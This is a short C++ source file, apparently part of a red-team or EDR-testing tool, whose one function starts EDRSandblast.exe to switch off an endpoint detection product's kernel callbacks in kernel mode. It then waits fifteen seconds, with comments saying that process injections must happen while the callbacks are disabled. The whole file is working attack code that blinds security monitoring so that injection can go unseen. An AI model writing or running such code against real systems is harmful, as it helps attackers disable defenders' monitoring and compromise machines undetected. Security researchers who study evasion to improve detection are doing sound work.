#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>

#include "sandblast.h"
#include "utils.h"

// disables kernel callbacks
bool disable_kernel_callbacks_ok() {
    STARTUPINFO si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);

    std::wstring cmd = get_base_path() + L"tools\\EDRSandblast.exe toggle_callbacks 0t1 --kernelmode -i";
    if (!CreateProcess(
        NULL, &cmd[0], NULL, NULL,
        FALSE, 0, NULL, NULL, &si, &pi)) {
        std::cerr << "[!] Sandblast: Failed to start '" << wstring2string(cmd) << "', Error:" << GetLastError() << "\n";
        return false;
    }
    std::cout << "[+] Sandblast: Started '" << wstring2string(cmd) << "'\n";
    std::cout << "[+] Sandblast: Waiting 15 sec (may need manual adjusting)...\n"; // ensure callbacks are disabled before returning
    std::cout << "// --------------------------- EDR Sandblast start marker --------------------------- //\n"; // mark start in logs
	Sleep(15000); // on this system it takes ~10 sec until callbacks are disabled, all injections must take place between t+10 and t+30 sec
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    std::cout << "// --------------------------- EDR Sandblast end marker --------------------------- //\n"; // mark end in logs
    return true;
}
